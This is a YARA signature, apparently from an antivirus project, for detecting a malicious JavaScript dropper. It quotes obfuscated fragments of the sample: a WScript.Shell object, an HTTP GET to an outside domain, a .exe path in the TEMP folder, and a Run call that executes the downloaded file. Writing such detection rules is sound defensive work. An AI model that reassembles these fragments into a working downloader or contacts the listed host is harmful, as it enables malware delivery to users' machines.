rule sig_20160330_2b9f5792ad7dacf4da1f42b953bbe57f {
  meta:
    description = "datamaliciousorder - file 20160330_2b9f5792ad7dacf4da1f42b953bbe57f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7077c57eb385c84b12c39893fb70f660176ac85824b9920d229c7f7aca0e2ac"

  strings:
    $s1  = "_P[_RO](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "function _U(_MA, _WW){_M = _M * 1; return _MA - _WW;};" fullword ascii
    $s3  = "var _I0 = function _CB() {return WScript[_W](\"WScript\"+\".Shell\");}(), _JU = 11;" fullword ascii
    $s4  = "if (_P[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _JV() {return _I0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1Pfpkp4og4u.ex\" + \"e\";};" fullword ascii
    $s6  = "function _B(){return _X + \"\";};" fullword ascii
    $s7  = "function _HK(_K){_I0[\"Run\"](_K, _M, _M);};" fullword ascii
    $s8  = "function _BD() {return ((_V == true) && (_V == _R0)) ? 1 : _M;};" fullword ascii
    $s9  = "var _L = new this[\"Date\"]();" fullword ascii
    $s10 = "function _IE()" fullword ascii
    $s11 = "function _HS(){return 22;};" fullword ascii
    $s12 = "function _AA(){return _W;};" fullword ascii
    $s13 = "function _N(_ZB) {var _XI = (1, 2, 3, 4, 5, _ZB); return _XI;};" fullword ascii
    $s14 = "return _U(_UX, _L0);" fullword ascii
    $s15 = " while (_EO){" fullword ascii
    $s16 = "var _I = false;" fullword ascii
    $s17 = "var _R0 = false;" fullword ascii
    $s18 = "_R0 = true; " fullword ascii
    $s19 = "var _V = false;" fullword ascii
    $s20 = "_V = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}